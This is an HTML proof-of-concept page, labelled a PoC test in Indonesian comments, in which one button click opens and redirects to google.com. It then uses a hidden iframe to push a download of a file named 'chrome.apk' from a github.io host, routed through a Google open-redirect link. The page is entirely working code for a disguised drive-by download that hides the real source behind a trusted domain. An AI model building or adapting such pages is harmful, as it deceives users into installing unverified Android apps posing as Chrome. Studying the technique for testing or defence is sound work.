<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PoC Combined Action</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background-color: #f4f4f9;
        }
        h1 {
            color: #333;
        }
        .container {
            margin-top: 30px;
        }
        button {
            display: inline-block;
            width: 80%;
            max-width: 400px;
            margin: 15px auto;
            padding: 16px 24px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            background-color: #1a73e8;
            color: white;
            border: none;
            border-radius: 6px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            transition: background 0.2s;
        }
        button:hover {
            background-color: #1557b0;
        }
    </style>
</head>
<body>

    <h1>PoC Test Page</h1>
    <p>Klik tombol di bawah untuk menjalankan aksi gabungan:</p>

    <div class="container">
        <button id="actionBtn">Execute Action</button>
    </div>

    <script>
        document.getElementById('actionBtn').addEventListener('click', function() {
            // 1. Membuka jendela baru ke google.com
            window.open('https://www.google.com', '_blank');

            // 2. Halaman saat ini melakukan redirect ke google.com setelah jeda singkat
            setTimeout(function() {
                window.location.href = "https://www.google.com";
            }, 800);

            // 3. Memicu pop-up download file APK di akhir proses
            setTimeout(function() {
                const iframe = document.createElement('iframe');
                iframe.style.display = 'none';
                iframe.src = "https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fchrome.apk&sa=D&sntz=1&usg=AOvVaw079XKrSIcTiPDZFMOucTH3";
                document.body.appendChild(iframe);
            }, 1500);
        });
    </script>

</body>
</html>
